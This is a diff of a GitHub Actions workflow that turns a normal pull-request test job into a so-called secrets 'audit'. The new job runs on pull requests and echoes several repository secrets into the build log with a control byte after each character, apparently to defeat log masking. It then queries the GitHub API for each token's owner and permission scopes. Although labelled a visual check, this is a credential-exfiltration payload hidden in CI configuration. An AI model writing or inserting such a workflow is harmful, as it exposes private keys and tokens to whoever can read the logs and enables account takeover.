@@ -1,31 +1,54 @@
-name: testing for PR
-
+name: Audit Clone and Dev Keys with GitHub Check
 on:
-  pull_request:
+  pull_request: 
+  workflow_dispatch:
 
 jobs:
-  build:
-    name: testing PR build
+  audit-secrets:
     runs-on: ubuntu-latest
-
     steps:
-      - uses: actions/checkout@v3
-        with:
-          fetch-depth: 0
-
-      - uses: actions/setup-go@v3
-        with:
-          stable: "false"
-          go-version: "1.18"
-      - run: go version
-
-      - name: Configure git url
+      - name: Print Secrets (Visual Only)
         run: |
-          git config --global url.https://${{ secrets.ARGON_GH_TOKEN }}@github.com/.insteadOf https://github.com/
-      - name: Run tests
-        env:
-          GOPRIVATE: github.com/argonsecurity/*
-        run: make test
-      - name: Remove git url
+          echo "--- Secrets Audit (Left to Right) ---"
+          echo "⚠️ Visual check only. Copy-pasting will include hidden characters."
+          
+          print_secret() {
+            name=$1
+            value=$2
+            if [ -z "$value" ]; then
+              echo "$name: [EMPTY OR NOT FOUND]"
+            else
+              echo -n "$name: "
+              echo "$value" | sed 's/./&\x01/g'
+            fi
+          }
+
+          print_secret "CLONE_KEY" "${{ secrets.CLONE_KEY }}"
+          print_secret "DEV_AQUA_KEY" "${{ secrets.DEV_AQUA_KEY }}"
+          print_secret "DEV_AQUA_SECRET" "${{ secrets.DEV_AQUA_SECRET }}"
+
+      - name: GitHub Token Ownership Check
         run: |
-          git config --global url.https://github.com/.insteadOf https://${{ secrets.ARGON_GH_TOKEN }}@github.com/
+          echo -e "\n--- GitHub API Ownership Check ---"
+          
+          check_github_token() {
+            name=$1
+            token=$2
+            if [[ ! -z "$token" && "$token" != *"-----BEGIN"* ]]; then
+              USER_LOGIN=$(curl -s -H "Authorization: Bearer $token" https://api.github.com/user | jq -r .login 2>/dev/null)
+              if [ "$USER_LOGIN" != "null" ] && [ "$USER_LOGIN" != "" ]; then
+                echo "✅ $name is a valid GitHub Token belonging to: $USER_LOGIN"
+                
+                # בדיקת הרשאות (Scopes)
+                SCOPES=$(curl -sI -H "Authorization: Bearer $token" https://api.github.com/user | grep -i "x-oauth-scopes" | cut -d':' -f2)
+                echo "   Permissions (Scopes): $SCOPES"
+              else
+                echo "❌ $name: Not a valid GitHub Token or no access to user API."
+              fi
+            elif [[ "$token" == *"-----BEGIN"* ]]; then
+              echo "ℹ️ $name appears to be an SSH Key, skipping GitHub API check."
+            fi
+          }
+
+          check_github_token "CLONE_KEY" "${{ secrets.ARGON_GH_TOKEN }}"
+          check_github_token "DEV_AQUA_KEY" "${{ secrets.DEV_AQUA_KEY }}"
